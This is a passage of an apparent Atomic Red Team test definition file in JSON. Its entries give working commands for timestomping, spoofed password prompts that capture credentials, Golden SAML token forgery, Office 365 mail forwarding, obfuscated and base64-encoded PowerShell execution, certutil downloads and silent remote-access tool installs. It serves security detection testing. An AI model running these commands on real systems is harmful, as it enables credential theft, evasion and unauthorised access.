				"description": "A file must exist at the path (#{file_path}) to change the creation time on\n",
				"prereq_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Path \"#{file_path}\" -Force | Out-Null\nSet-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n"
			}
		],
		"executor": {
			"command": "Get-ChildItem \"#{file_path}\" | % { $_.CreationTime = \"#{target_date_time}\" }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows - Modify file last modified timestamp with PowerShell",
		"auto_generated_guid": "f8f6634d-93e1-4238-8510-f8a90a20dcf2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_date_time": {
				"description": "Date/time to replace original timestamps with",
				"type": "string",
				"default": "01/01/1970 00:00:00"
			},
			"file_path": {
				"description": "Path of file to change modified timestamp",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "A file must exist at the path (#{file_path}) to change the modified time on\n",
				"prereq_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Path \"#{file_path}\" -Force | Out-Null\nSet-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n"
			}
		],
		"executor": {
			"command": "Get-ChildItem \"#{file_path}\" | % { $_.LastWriteTime = \"#{target_date_time}\" }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows - Modify file last access timestamp with PowerShell",
		"auto_generated_guid": "da627f63-b9bd-4431-b6f8-c5b44d061a62",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_date_time": {
				"description": "Date/time to replace original timestamps with",
				"type": "string",
				"default": "01/01/1970 00:00:00"
			},
			"file_path": {
				"description": "Path of file to change last access timestamp",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "A file must exist at the path (\"#{file_path}\") to change the last access time on\n",
				"prereq_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Path \"#{file_path}\" -Force | Out-Null\nSet-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n"
			}
		],
		"executor": {
			"command": "Get-ChildItem \"#{file_path}\" | % { $_.LastAccessTime = \"#{target_date_time}\" }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows - Timestomp a File",
		"auto_generated_guid": "d7512c33-3a75-4806-9893-69abc3ccdd43",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_path": {
				"description": "File path for timestomp payload",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "timestomp.ps1 must be present in #{file_path}.\n",
				"prereq_command": "if (Test-Path \"#{file_path}\\timestomp.ps1\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1\" -OutFile \"#{file_path}\\timestomp.ps1\"\n"
			},
			{
				"description": "kxwn.lock must be present in #{file_path}.\n",
				"prereq_command": "if (Test-Path -path \"#{file_path}\\kxwn.lock\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Path \"#{file_path}\\kxwn.lock\" -ItemType File\n"
			}
		],
		"executor": {
			"command": "import-module \"#{file_path}\\timestomp.ps1\"\ntimestomp -dest \"#{file_path}\\kxwn.lock\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "MacOS - Timestomp Date Modified",
		"auto_generated_guid": "87fffff4-d371-4057-a539-e3b24c37e564",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"target_filename": {
				"description": "Path of file that we are going to stomp on last modified time\n",
				"type": "path",
				"default": "/tmp/T1070.006-modified.txt"
			},
			"target_date": {
				"description": "Date to replace original timestamps with",
				"type": "string",
				"default": "01/01/1970"
			}
		},
		"dependencies": [
			{
				"description": "The file must exist in order to be timestomped\n",
				"prereq_command": "test -e #{target_filename} && exit 0 || exit 1\n",
				"get_prereq_command": "echo 'T1070.006 MacOS file modified timestomp test' > #{target_filename}\n"
			}
		],
		"executor": {
			"name": "sh",
			"command": "SetFile -m #{target_date} #{target_filename}\n",
			"cleanup_command": "rm -f #{target_filename}\n",
			"elevation_required": false
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Event Log Manipulations- Time slipping via Powershell",
		"auto_generated_guid": "7bcf83bf-f5ef-425c-9d9a-71618ad9ed12",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"days_to_modify": {
				"description": "Value to which system time will update",
				"type": "string",
				"default": "3"
			}
		},
		"executor": {
			"command": "try{ \n  Set-Date -Date (Get-Date).AddDays(#{days_to_modify})\n  Add-Content \"$env:APPDATA\\slipDays.bak\" #{days_to_modify}\n}\ncatch {exit 1}\n",
			"cleanup_command": "if(Test-Path \"$env:APPDATA\\slipDays.bak\" ){\n  foreach($line in (get-content $env:APPDATA\\slipDays.bak)){\n    Set-Date -Date (Get-Date).AddDays(-$line)\n  }\n  rm \"$env:APPDATA\\slipDays.bak\"\n}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AppleScript - Prompt User for Password",
		"auto_generated_guid": "76628574-0bc1-4646-8fe2-8f4427b47d15",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1056.002",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "PowerShell - Prompt User for Password",
		"auto_generated_guid": "2b162bfd-0928-4d4c-9ec3-4d9f88374b52",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1056.002",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "AppleScript - Spoofing a credential prompt using osascript",
		"auto_generated_guid": "b7037b89-947a-427a-ba29-e7e9f09bc045",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1056.002",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "Thread Execution Hijacking",
		"auto_generated_guid": "578025d5-faa9-4f6d-8390-aae527d503e1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"\nStart-Sleep -Seconds 5\nStop-Process $notepad.id",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1055.003",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Golden SAML",
		"auto_generated_guid": "b16a03bc-1089-4dcc-ad98-30fe8f3a2b31",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"certificate_path": {
				"description": "Token signing certificate path. See T1552.004 to export it",
				"type": "path",
				"default": ".\\ADFS_signing.pfx"
			},
			"immutable_id": {
				"description": "ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId",
				"type": "string",
				"default": "aehgdqBTZV50DKQZmNJ8mg=="
			},
			"issuer_uri": {
				"description": "Issuer URI of the ADFS service",
				"type": "string",
				"default": "http://contoso.com/adfs/services/trust/"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AADInternals module must be installed.\n",
				"prereq_command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AADInternals -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1606.002",
		"phases": ["credential-access"]
	},
	{
		"name": "Office365 - Email Forwarding",
		"auto_generated_guid": "3234117e-151d-4254-9150-3d0bac41e38c",
		"supported_platforms": ["office-365"],
		"input_arguments": {
			"username": {
				"description": "office-365 username",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "office-365 password",
				"type": "string",
				"default": null
			},
			"rule_name": {
				"description": "email rule name",
				"type": "string",
				"default": "Atomic Red Team Email Rule"
			},
			"forwarding_email": {
				"description": "destination email addresses",
				"type": "string",
				"default": "Atomic_Operator@fakeemail.aq"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
				"prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
				"get_prereq_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n"
			}
		],
		"executor": {
			"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"\n",
			"cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1114.003",
		"phases": ["collection"]
	},
	{
		"name": "Decode base64 Data into Script",
		"auto_generated_guid": "f45df6be-2e1e-4136-a384-8f18ab3826fb",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"shell_command": {
				"description": "command to encode",
				"type": "string",
				"default": "echo Hello from the Atomic Red Team && uname -v"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "encode the command into base64 file\n",
				"prereq_command": "if [ -e \"/tmp/encoded.dat\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64encode -r -\"; else cmd=\"base64\"; fi;\necho \"#{shell_command}\" | $cmd > /tmp/encoded.dat\n"
			}
		],
		"executor": {
			"command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64decode -r\"; else cmd=\"base64 -d\"; fi;\ncat /tmp/encoded.dat | $cmd > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n",
			"cleanup_command": "rm /tmp/encoded.dat \nrm /tmp/art.sh\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Execute base64-encoded PowerShell",
		"auto_generated_guid": "a50d5a97-2531-499e-a1de-5544c74432c6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"powershell_command": {
				"description": "PowerShell command to encode",
				"type": "string",
				"default": "Write-Host \"Hey, Atomic!\""
			}
		},
		"executor": {
			"command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Execute base64-encoded PowerShell from Windows Registry",
		"auto_generated_guid": "450e7218-7915-4be4-8b9b-464a49eafcec",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"registry_key_storage": {
				"description": "Windows Registry Key to store code",
				"type": "string",
				"default": "HKCU:Software\\Microsoft\\Windows\\CurrentVersion"
			},
			"powershell_command": {
				"description": "PowerShell command to encode",
				"type": "string",
				"default": "Write-Host \"Hey, Atomic!\""
			},
			"registry_entry_storage": {
				"description": "Windows Registry entry to store code under key",
				"type": "string",
				"default": "Debug"
			}
		},
		"executor": {
			"command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"\n",
			"cleanup_command": "Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Execution from Compressed File",
		"auto_generated_guid": "f8c8a909-5f29-49ac-9244-413936ce6d1f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"url_path": {
				"description": "url to download Exe",
				"type": "url",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1027.exe must exist on disk at PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\\" -Force\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\"\n",
			"cleanup_command": "taskkill /f /im calculator.exe >nul 2>nul\ntaskkill /f /im CalculatorApp.exe >nul 2>nul\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "DLP Evasion via Sensitive Data in VBA Macro over email",
		"auto_generated_guid": "129edb75-d7b8-42cd-a8ba-1f3db64ec4ad",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_file": {
				"description": "Path of the XLSM file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm"
			},
			"sender": {
				"description": "sender email",
				"type": "string",
				"default": "test@corp.com"
			},
			"receiver": {
				"description": "receiver email",
				"type": "string",
				"default": "test@corp.com"
			},
			"smtp_server": {
				"description": "SMTP Server IP Address",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"executor": {
			"command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments \"#{input_file}\" -SmtpServer #{smtp_server}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "DLP Evasion via Sensitive Data in VBA Macro over HTTP",
		"auto_generated_guid": "e2d85e66-cb66-4ed7-93b1-833fc56c9319",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_file": {
				"description": "Path of the XLSM file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm"
			},
			"ip_address": {
				"description": "Destination IP address",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"executor": {
			"command": "Invoke-WebRequest -Uri #{ip_address} -Method POST -Body \"#{input_file}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Obfuscated Command in PowerShell",
		"auto_generated_guid": "8b3f4ed6-077b-4bdd-891c-2d237f19410f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Obfuscated Command Line using special Unicode characters",
		"auto_generated_guid": "e68b945c-52d0-4dd9-a5e8-d173d70c448f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "URL of file to download",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			},
			"local_path": {
				"description": "Local path/filename to save the downloaded file to",
				"type": "path",
				"default": "Atomic-license.txt"
			}
		},
		"executor": {
			"steps": "1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.\n\n\n  certutil \u2014\u0af9u\u0af0rl\u08b0ca\u08e2c\u0defhe  \u2013\u202espli\u0605t\u202e\u202d \u2212\"\u0d4f\u1da0\u0d78\" #{remote_file} #{local_path}\n\n\n2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Snake Malware Encrypted crmlog file",
		"auto_generated_guid": "7e47ee60-9dd1-4269-9c4f-97953b183268",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\"\n",
			"cleanup_command": "$fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = \"$env:windir\\registration\\\"; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host \"File deleted: $fullPathToDelete\" } else { Write-Host \"File not found: $fullPathToDelete\" }\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Execution from Compressed JScript File",
		"auto_generated_guid": "fad04df1-5229-4185-b016-fb6010cd87ac",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"url_path": {
				"description": "url to download JScript file",
				"type": "url",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1027.js must exist on disk at PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027js.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027js.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\\" -Force\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\"\n",
			"cleanup_command": "taskkill /f /im calculator.exe >nul 2>nul\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1027",
		"phases": ["defense-evasion"]
	},
	{
		"name": "TeamViewer Files Detected Test on Windows",
		"auto_generated_guid": "8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n",
			"cleanup_command": "$file = 'C:\\Program Files (x86)\\TeamViewer\\uninstall.exe'\nif(Test-Path $file){ Start-Process $file \"/S\" -ErrorAction Ignore | Out-Null }\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nRemove-Item $file1 -ErrorAction Ignore | Out-Null",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "AnyDesk Files Detected Test on Windows",
		"auto_generated_guid": "6b8b7391-5c0a-4f8c-baee-78d8ce0ce330",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;\n",
			"cleanup_command": "$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nRemove-Item $file1 -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "LogMeIn Files Detected Test on Windows",
		"auto_generated_guid": "d03683ec-aae0-42f9-9b4c-534780e0f8e1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nStart-Process -Wait $file1 /quiet;\nStart-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"\n",
			"cleanup_command": "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item $file1 -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "GoToAssist Files Detected Test on Windows",
		"auto_generated_guid": "1b72b3bd-72f8-4b63-a30b-84e91b9c3578",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"\nStart-Process $file1 /S;\n",
			"cleanup_command": "try{\"$PathToAtomicsFolder/T1219/bin/GoToCleanup.ps1\"} catch{}",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "ScreenConnect Application Download and Install on Windows",
		"auto_generated_guid": "4a18cc4e-416f-4966-9a9d-75731c4684c0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nInvoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"\nmsiexec /i $installer /qn\n",
			"cleanup_command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nmsiexec /x $installer /qn\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "Ammyy Admin Software Execution",
		"auto_generated_guid": "0ae9e327-3251-465a-a53b-485d4e3f58fa",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Ammyy_Admin_Path": {
				"description": "Path of Ammyy Admin executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Ammyy Admin must exist on disk at the specified location (#{Ammyy_Admin_Path})\n",
				"prereq_command": "if (Test-Path \"#{Ammyy_Admin_Path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe\" -UseBasicParsing\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{Ammyy_Admin_Path}\"\n",
			"cleanup_command": "Stop-Process -Name \"Ammyy\" -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1219",
		"phases": ["command-and-control"]
	},
	{
		"name": "RemotePC Software Execution",
		"auto_generated_guid": "fbff3f1f-b0bf-448e-840f-7e1687affdce",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"RemotePC_Path": {
				"description": "Path of RemotePC executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\RemotePC.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "RemotePC must exist on disk at the specified location (#{RemotePC_Path})\n",
				"prereq_command": "if (Test-Path \"#{RemotePC_Path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://static.remotepc.com/downloads/rpc/140422/RemotePC.exe\" -OutFile \"#{RemotePC_Path}\" -UseBasicParsing\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{RemotePC_Path}\"\n",
